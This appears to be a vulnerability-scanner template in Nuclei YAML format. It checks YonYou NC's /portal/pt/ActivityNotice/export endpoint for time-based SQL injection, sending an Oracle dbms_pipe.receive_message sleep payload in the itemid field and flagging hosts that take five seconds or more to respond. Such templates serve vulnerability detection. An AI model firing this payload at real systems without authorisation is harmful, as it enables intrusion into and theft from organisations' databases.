id: YonYouNC-ActivityNotice-export-sqlInjection

info:
  name: YonYouNC-ActivityNotice-export-sqlInjection
  author: iSee857
  severity: high
  description: YonYouNC-ActivityNotice-export-sqlInjection

requests:
  - method: POST
    raw:
      - |
        POST /portal/pt/ActivityNotice/export?pageId=login HTTP/1.1
        Host: {{Host}}
        Content-type:application/x-www-form-urlencoded

        itemid=1' AND 1=dbms_pipe.receive_message('RDS', 5)--
      
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"

      - type: status
        status:
          - 200